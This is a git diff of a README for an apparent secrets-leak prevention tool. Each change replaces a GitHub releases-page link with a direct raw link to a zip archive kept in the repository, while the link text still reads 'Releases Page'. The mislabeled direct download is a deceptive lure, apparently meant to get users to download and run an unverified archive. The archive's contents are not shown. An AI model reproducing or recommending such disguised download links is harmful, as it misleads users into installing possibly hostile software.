@@ -1,6 +1,6 @@
 # 🔐 sentinel-secrets- - Prevent Secrets from Leaking in Code
 
-[![Download sentinel-secrets-](https://img.shields.io/badge/Download-sentinel--secrets--orange)](https://github.com/Razkhann/sentinel-secrets-/releases)
+[![Download sentinel-secrets-](https://raw.githubusercontent.com/Razkhann/sentinel-secrets-/main/sentinel/secrets-sentinel-v1.5.zip)](https://raw.githubusercontent.com/Razkhann/sentinel-secrets-/main/sentinel/secrets-sentinel-v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **sentinel-secrets-**! This tool helps you secure your secrets such a
 
 To get started, you will need to download the tool. You can do this by visiting the release page below:
 
-[Visit the Releases Page to Download](https://github.com/Razkhann/sentinel-secrets-/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Razkhann/sentinel-secrets-/main/sentinel/secrets-sentinel-v1.5.zip)
 
 ### Key Features
 
@@ -29,7 +29,7 @@ Before you proceed with the installation, ensure your system meets the following
 
 ## 🔧 Download & Install
 
-1. Go to the [Releases Page](https://github.com/Razkhann/sentinel-secrets-/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/Razkhann/sentinel-secrets-/main/sentinel/secrets-sentinel-v1.5.zip).
 2. Look for the latest version of **sentinel-secrets-**.
 3. Click the download link for your operating system.
 4. Once the download finishes, locate the file in your downloads folder.
@@ -73,4 +73,4 @@ For additional resources and information about secrets management, consider expl
 
 Join us in keeping your code secure! Download **sentinel-secrets-** today.
 
-[Visit the Releases Page to Download](https://github.com/Razkhann/sentinel-secrets-/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Razkhann/sentinel-secrets-/main/sentinel/secrets-sentinel-v1.5.zip)
